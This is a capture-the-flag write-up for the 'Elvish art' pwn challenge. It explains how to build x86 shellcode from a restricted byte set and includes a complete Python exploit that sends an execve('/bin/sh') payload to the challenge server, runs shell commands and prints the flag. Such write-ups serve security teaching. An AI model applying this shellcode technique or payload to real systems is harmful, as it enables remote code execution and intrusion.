# Elvish art - Pwn (300)

The North Pole R&D Division has spent decades bringing machine language closer
to elvish language. At last, they succeeded... in a way

Service: nc 3.81.191.176 1222

Download: [Mr8wiOo6nmHNJRHrRgoWSN9P2KKkfcLS-
elvishart.tar.xz](https://s3.amazonaws.com/advent2018/Mr8wiOo6nmHNJRHrRgoWSN9P2KKkfcLS-
elvishart.tar.xz)  
Mirror: [Mr8wiOo6nmHNJRHrRgoWSN9P2KKkfcLS-
elvishart.tar.xz](./static/Mr8wiOo6nmHNJRHrRgoWSN9P2KKkfcLS-elvishart.tar.xz)

## Disassembly

This problem is a fairly straightforward pwnable. Opening up the binary and
disassembling I came up with the following (rough) pseudocode:

```  
shellcode = mmap(length=0x100000, prot=RWX)  
while True:  
 ch = readbyte()  
 if ch == 0xff:  
   jmp shellcode  
 elif strchr(ascii_art,ch) != NULL or ch == 0  
   append ch to shellcode  
 else  
   print("invalid char")  
   exit  
```

So basically the problem setup is to construct shellcode from a restricted
character set and send it to the server.

## Setup for Shellcode

First, I started by looking at the available byte values and determining what
sort of instructions were available. Below is each byte and what an x86
instruction starting with that byte looks like:

```  
db 0x00 add (various) [e??+??], [abc][lh]  
db 0x0a or (various) [abc][lh], [e??+??]  
db 0x20 and (various) [e??+??], [abc][lh]  
db 0x27 daa? Decimal Adjust AL after Subtraction  
db 0x28 sub (various) [e??+??], [abc][lh]  
db 0x29 sub (various) [e??+??], e??  
db 0x2a sub (various) ah, al, bh, ch, cl, bl  
db 0x2d AABBCCDD sub eax,0xDDCCBBAA  
db 0x2f das? Decimal Adjust AL after Subtraction;  
db 0x3a cmp (various) ah, al, bh, ch, cl, bl  
db 0x3c XX cmp al, XX  
db 0x3d AABBCCDD cmp eax,0xDDCCBBAA  
db 0x3e ds?  
db 0x40 inc eax  
db 0x4b dec ebx  
db 0x4f dec edi  
db 0x56 push esi  
db 0x5b pop ebx  
db 0x5c pop esp  
db 0x5d pop ebp  
db 0x5e pop esi  
db 0x5f pop edi  
db 0x60 pushad  
db 0x6f outsd? -- outputs edx to serial port  
db 0x7b XX jpo (parity odd)  
db 0x7c XX jl  
db 0x7d XX jge  
db 0x7e XX jg  
```

As a sanity check I tried making shellcode with just these bytes and
`msfvenom`, but as I suspected the problem was not that easy and couldn't
generate shellcode for me automatically.

```  
$ msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b
'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x2b\x2c\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4c\x4d\x4e\x50\x51\x52\x53\x54\x55\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'  
No platform was selected, choosing Msf::Module::Platform::Linux from the
payload  
No Arch selected, selecting Arch: x86 from the payload  
Found 10 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai failed with An encoding exception occurred.  
Attempting to encode payload with 1 iterations of generic/none  
generic/none failed with Encoding failed due to a bad character (index=25,
char=0x08)  
Attempting to encode payload with 1 iterations of x86/call4_dword_xor  
x86/call4_dword_xor failed with A valid encoding key could not be found.  
Attempting to encode payload with 1 iterations of x86/countdown  
Error: No valid set instruction could be created!  
```

As a last piece of information gathering, I intentionally crashed the program
around the 'jmp eax (shellcode)' instruction to see what the initial register
values were when we jumped to the shellcode.

```  
$ echo -e '\x00\x00\x00\xff' | LD_PRELOAD=/lib32/libSegFault.so ./chal   
Looks like valid ASCII art to me!!  
*** Segmentation fault  
Register dump:

EAX: f7be3000   EBX: 565fffbc   ECX: 00000000   EDX: f7eb989c  
ESI: f7eb8001   EDI: 00000000   EBP: ff936dd8   ESP: ff936dab

EIP: f7ce3004   EFLAGS: 00010282

CS: 0023   DS: 002b   ES: 002b   FS: 0000   GS: 0063   SS: 002b

Trap: 0000000e   Error: 00000006   OldMask: 00000000  
ESP/signal: ff936dab   CR2: 00000000

FPUCW: ffff037f   FPUSW: ffff0000   TAG: ffffffff  
IPOFF: 00000000   CSSEL: 0023   DATAOFF: 0000ffff   DATASEL: 002b

ST(0) 0000 0000000000000000   ST(1) 0000 0000000000000000  
ST(2) 0000 0000000000000000   ST(3) 0000 0000000000000000  
ST(4) 0000 0000000000000000   ST(5) 0000 0000000000000000  
ST(6) 0000 0000000000000000   ST(7) 0000 0000000000000000

Backtrace:

Memory map:

565fe000-565ff000 r-xp 00000000 08:01 1056502
/home/john/elvishart/chal  
565ff000-56600000 r--p 00000000 08:01 1056502
/home/john/elvishart/chal  
56600000-56601000 rw-p 00001000 08:01 1056502
/home/john/elvishart/chal  
57f49000-57f6b000 rw-p 00000000 00:00 0
[heap]  
f7be3000-f7ce3000 rwxp 00000000 00:00 0  
f7ce3000-f7eb5000 r-xp 00000000 08:01 808422
/lib32/libc-2.27.so  
f7eb5000-f7eb6000 ---p 001d2000 08:01 808422
/lib32/libc-2.27.so  
f7eb6000-f7eb8000 r--p 001d2000 08:01 808422
/lib32/libc-2.27.so  
f7eb8000-f7eb9000 rw-p 001d4000 08:01 808422
/lib32/libc-2.27.so  
f7eb9000-f7ebc000 rw-p 00000000 00:00 0  
f7ed3000-f7ed6000 r-xp 00000000 08:01 808420
/lib32/libSegFault.so  
f7ed6000-f7ed7000 r--p 00002000 08:01 808420
/lib32/libSegFault.so  
f7ed7000-f7ed8000 rw-p 00003000 08:01 808420
/lib32/libSegFault.so  
f7ed8000-f7eda000 rw-p 00000000 00:00 0  
f7eda000-f7edd000 r--p 00000000 00:00 0
[vvar]  
f7edd000-f7edf000 r-xp 00000000 00:00 0
[vdso]  
f7edf000-f7f05000 r-xp 00000000 08:01 808418
/lib32/ld-2.27.so  
f7f05000-f7f06000 r--p 00025000 08:01 808418
/lib32/ld-2.27.so  
f7f06000-f7f07000 rw-p 00026000 08:01 808418
/lib32/ld-2.27.so  
ff918000-ff939000 rw-p 00000000 00:00 0
[stack]  
Segmentation fault (core dumped)  
```

This showed that `EIP == EAX ==` pointer to shellcode, and `ECX == EDI == 0` -
both good starting points.

## Creating Shellcode

With all of the above ready to go, I needed a way to construct arbitrary
shellcode instructions (of any byte values) and then execute them. Luckily we
have a lot of space for our shellcode to work with (0x100000 bytes). At this
point, I took a look at what instructions were available and came up with the
following strategy:

* set `eax` to a value farther along in the shellcode  
* set some other register to a byte of new shellcode and write it to `*eax`  
* increment `eax`  
* fill the remaining space (between all of this logic and the new shellcode) with innocuous instructions - there's no `0x90` for a NOP-sled, but something similar should work

Ok, step 1 - set `eax` to the end of the shellcode. We have an arbitrary `sub
eax, 0xDDCCBBAA` but need the `AA`, `BB`, `CC`, `DD` byte values to be from
our whitelisted set of bytes. Four values which work are `0x4b3e4040`,
`0x403d4040`, `0x3a3a4040`, and `0x3a3a4040` which sets `eax := eax +
0xfff00`. Perfect.

Step 2 - create shellcode in a designated register. Well, we know that `edi`
is zero, and we have a `pushad` and `pop ebx` avaiable so use all three in
concert to set `ebx` to zero. From there, we can call `dec ebx` to subtract
from `ebx` one at a time until we have a byte of shellcode. And finally, when
we have the right byte lined up in the low byte of `ebx` we can call `add
[eax+0x0],bl` to move that low byte into `eax`. Finally increment `eax` to
move into the next byte of shellcode.

Last step - get some sort of NOP-sled or meaningless instruction sled to our
shellcode. I chose `inc eax` followed by some `0x00` bytes where the target
shellcode would go (offset `0xfff00`).

Using some `execl(/bin/sh)` shellcode generated from `msfvenom` I constructed
shellcode, converted it to bytes with
[nasm](https://nasm.us/doc/nasmdoc2.html), and then sent it to the server
followed by some shell commands to dump the flag. The final python code for
all of this is given below:

```python  
#!/usr/bin/env python3

import sys  
import random  
import subprocess  
import socket  
import time

def random_shellcode():

	whitelist_bytes = b'\x00\x0a\x20\x27\x28\x29\x2a\x2d\x2f\x3a\x3c\x3d\x3e\x40\x4b\x4f\x56\x5b\x5c\x5d\x5e\x5f\x60\x6f\x7b\x7c\x7d\x7e'  
	whitelist_arr = list(whitelist_bytes)

	arr = [random.choice(whitelist_arr) for i in range(1000000)]

	with open('shellcode_random','wb') as f:  
		f.write(bytes(arr))  
		f.close()  
	subprocess.Popen(['ndisasm','-b','32','shellcode_random']).wait()

def real_shellcode():

	# allocated space is 0x100000

	# eax == shellcode, want eax + 0x100000-40ish  
	print('BITS 32')  
	print('sub eax,0x4b3e4040')  
	print('sub eax,0x403d4040')  
	print('sub eax,0x3a3a4040')  
	print('sub eax,0x3a3a4040')  
	# eax = eax + 0xfff00

	print('pushad')  
	print('pop ebx') # edi  
	# ebx == 0

	buf  = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"  
	buf += b"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"  
	buf += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"  
	buf += b"\x89\xe1\xcd\x80"

	ebx = 0  
	for ch in buf:  
		n = (ebx-ch) % 256  
		for i in range(n):  
			print('dec ebx')  
		ebx = ebx - n  
		#print('add [eax+0x0],bl')  
		print('db 0x00,0x5C,0x20,0x00')  
		print('inc eax')

	for i in range(0xfff00-0x0000186D):  
		print('inc eax')

	for i in range(0x40):  
		print('db 0x00')  
	print('db 0xff')

	#print("db 'id', 0x0a")

def connect_to_server():  
	s = socket.socket()  
	s.settimeout(10)  
	s.connect(('3.81.191.176',1222))  
	with open('gen_shell','rb') as f:  
		data = f.read(1024)  
		while len(data) > 0:  
			s.send(data)  
			data = f.read(1024)  
		f.close()  
	print(s.recv(50))

	time.sleep(1)  
	s.send(b'id\n')  
	print(s.recv(10240).decode('ascii'))  
	s.send(b'cat flag\n')  
	print(s.recv(10240).decode('ascii'))  
	s.send(b'ls -al\n')  
	print(s.recv(10240).decode('ascii'))  
	s.send(b'ps aux\n')  
	print(s.recv(10240).decode('ascii'))

if __name__ == '__main__':

	#random_shellcode()  
	#real_shellcode() # ./shellcode.py > gen_shell.asm && nasm gen_shell.asm

	connect_to_server()

```

All of this gives us the flag:

```  
$ ./shellcode.py  
b'Looks like valid ASCII art to me!!\n'  
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

AOTW{Every artist was 1st an amateur}

total 20  
drwxr-xr-x 1 root root 4096 Dec 21 21:54 .  
drwxr-xr-x 1 root root 4096 Dec 22 12:00 ..  
-rwxr-xr-x 1 root root 5464 Dec 21 11:49 chal  
-rw-r--r-- 1 1000 1000   38 Dec 21 21:34 flag

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  
root         1  0.0  0.0   4628   852 ?        Ss   Dec22   0:00 /bin/sh -c
/usr/sbin/inetd -d  
root         6  0.0  0.0  31872  2948 ?        S    Dec22   0:00
/usr/sbin/inetd -d  
nobody    5663  0.0  0.0   8804   864 ?        Ss   22:34   0:00
/usr/bin/timeout 60 /opt/chal  
nobody    5664  3.0  0.0   4628   772 ?        S    22:34   0:00 /bin/sh -c
/bin/sh  
nobody    5665  0.0  0.0   4628   828 ?        S    22:34   0:00 /bin/sh  
nobody    5669  0.0  0.0  34400  2796 ?        R    22:34   0:00 ps aux

```

Original writeup
(https://github.com/nononovak/otwadvent2018-ctfwriteup/blob/master/day22.md).